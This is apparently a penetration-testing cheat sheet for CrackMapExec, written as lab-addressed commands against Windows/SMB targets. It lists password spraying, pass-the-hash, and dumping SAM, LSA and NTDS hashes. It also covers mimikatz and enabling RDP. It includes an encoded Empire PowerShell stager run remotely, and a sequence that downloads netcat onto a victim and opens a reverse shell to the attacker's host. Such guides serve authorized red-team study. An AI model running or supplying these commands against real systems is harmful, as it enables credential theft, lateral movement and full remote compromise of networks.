# CME cheat sheet

A post-exploitation framework for linux and windows targets.

{% embed url="https://github.com/byt3bl33d3r/CrackMapExec" %}

## <mark style="color:red;">CrackMapExec full cheat sheet</mark>

{% embed url="https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/" %}

### <mark style="color:orange;">Installation</mark>

Install in python environment:

```
apt-get install -y libssl-dev libffi-dev python-dev build-essential
pip install --user pipenv
git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
 cd CrackMapExec && pipenv install
 pipenv shell
 python setup.py install
 crackmapexec
```

![](<../../../../.gitbook/assets/image (256).png>)

install on system (might have some problems):

```
apt install crackmapexec
```

the overal syntax is like this:

```
crackmapexec [protocol] [target] -u [username] -p [password] -H [hash or hash flie]
```

example:

```
crackmapexec smb 192.168.56.115 -u Administrator -H f4750eeb6dd87b3e60faa9cc23809750 cmd.exe
```

### <mark style="color:orange;">logs and output files</mark>

```
/root/.cme/logs/
```

### <mark style="color:orange;">Target Formats</mark>

```
crackmapexec <protocol> ms.evilcorp.org
crackmapexec <protocol> 192.168.1.0 192.168.0.2
crackmapexec <protocol> 192.168.1.0/24
crackmapexec <protocol> 192.168.1.0-28 10.0.0.1-67
crackmapexec <protocol> ~/targets.txt
```

Using Credentials

```
crackmapexec <protocol> <target(s)> -u username -p password
```

{% hint style="info" %}
When using usernames or passwords that contain special symbols, wrap them in single quotes to make your shell interpret them as a string
{% endhint %}

example:

```
crackmapexec <protocol> <target(s)> -u username -p 'Admin!123@'
```

{% hint style="info" %}
if credentials start with ‘-’ use the long format
{% endhint %}

```
crackmapexec <protocol> <target(s)> -u='-username' -p='-Admin!123@'
```

### <mark style="color:orange;">Using a credential set from the database</mark>

```
crackmapexec <protocol> <target(s)> -id <cred ID(s)>
```

### <mark style="color:orange;">Brute Forcing & Password Spraying</mark>

```
crackmapexec <protocol> <target(s)> -u username1 -p password1 password2
crackmapexec <protocol> <target(s)> -u username1 username2 -p password1
crackmapexec <protocol> <target(s)> -u /userlist -p /passlist
crackmapexec <protocol> <target(s)> -u /userlist -H /hashlist
```

### <mark style="color:orange;">Viewing available modules for a Protocol</mark>

```
cme <protocol> -L
```

#### using modules:

```
cme <protocol> <target(s)> -M <module name>
```

#### Viewing module options:

```
cme <protocol> -M <module name> --options
```

#### Using module options:

Module options are specified with the -o flag

```
cme <protocol> <target(s)> -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'
```

### <mark style="color:orange;">enumerate SMB status of all systems in a domain</mark>

```
crackmapexec  smb 192.168.56.1/24
```

### <mark style="color:orange;">pass the hash</mark>

```
crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH
crackmapexec smb <target(s)> -u username -H NTHASH
```

### <mark style="color:orange;">pass the password</mark>

```
crackmapexec smb 192.168.56.1/24 -u 'hesher' -p 'password123!'
```

## <mark style="color:red;">Empire Powershell Stager</mark>

since crackmapexec can execute  system commands and powershell one-liners, we can use this capability to run Empire powershell stagers remotely without touching the disk.

create listener and stager:

```
# listener
uselistener http
set Host http://192.168.56.1
set Port 9999
execute

# stager
usestager windows/wmic
set Listener http
execute
```

copy the generate powershell one-liner and run it with CME:

```
crackmapexec winrm 192.168.56.103 -u administrator -p repentless.1234 -X "powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBOAFEAQQAyAEEAQwA0AEEATQBRAEEANgBBAEQAawBBAE8AUQBBADUAQQBEAGsAQQAnACkAKQApADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACQAdwBjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwB3AHUAMQBOAHoAYQBRAE8AQQBZAHwAXwAjAFUAPAAsAD0ASQBAAGwANwBKAGsASwBMAG8AfQBpAEQAUgBIADYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHIAdgB5AEUAbgBEAEUAUgBvAHMARQB4AGEAdgByAD0AbABBAFQAaQBpAE4AUgBLAFUALwB2AE8AVQBsADAAYgB0AGEAYQBoAEgAbQA4AEUAMwBrAEkAPQAiACkAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA=="
```

## <mark style="color:red;">Options & Modules</mark>

### <mark style="color:orange;">dump sam file from all owned machines</mark>

```
--sam
```

### <mark style="color:orange;">enumerate the domain’s password policy</mark>

```
--pass-pol
```

### <mark style="color:orange;">dump lsa hashes</mark>

```
--lsa
```

### <mark style="color:orange;">dump ntds file</mark>

```
--ntds drsuapi
```

### <mark style="color:orange;">RID cycling</mark>

enumerate all AD objects including users and groups by guessing every resource identifier (RID)

```
 --rid-brute
```

### <mark style="color:orange;">enumerate AVs in the domain</mark>

```
-M enum_avproducts
```

### <mark style="color:orange;">execute a command on victim machine</mark>

```
-X whoami
```

### <mark style="color:orange;">execute powershell commands</mark>

```
 -X '$PSVersionTable'
```

### <mark style="color:orange;">NULL Sessions</mark>

```
crackmapexec smb <target(s)> -u '' -p ''
```

### <mark style="color:orange;">enum shares</mark>

```
--shares
```

### <mark style="color:orange;">enumerate the disks on the hosts</mark>

```
--disks
```

### <mark style="color:orange;">enumerate existing sessions on the hosts</mark>

```
--sessions
```

### <mark style="color:orange;">list running processes</mark>

```
-X get-process
```

### <mark style="color:orange;">enum the directory structure</mark>

```
-x "dir c:\\"  --exec-method smbexec
```

### <mark style="color:orange;">enable RDP</mark>

```
 -M rdp -o ACTION=enable
 xfreerdp /u:"hesher" /v:192.168.56.115:3389
```

## <mark style="color:red;">netcat or meterpreter reverse shell</mark>

First we setup our web server using Python's SimpleHTTPServer on port 443

```
python -m SimpleHTTPServer 443
```

upload the file ( download with powershell on victim)

```
crackmapexec smb 192.168.56.115 -u 'hesher' -p 'password123!' -X "(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.1:443/nc64.exe','c:\nc64.exe')"
```

run msf and setup a multi handler

```
use exploit/multi/handler
set payload windows/x86/shell/reverse_tcp
```

or nc listener

```
ncat --verbose --listen 443 --keep-open --max-conns 1 --nodns
```

run nc on victim side

```
crackmapexec smb 192.168.56.115 -u 'hesher' -p 'password123!' -X "c:\nc64.exe  -e cmd.exe 192.168.56.1 443"
```

upgrade to meterpreter session

```
Ctrl+z
sessions -u [id]
```
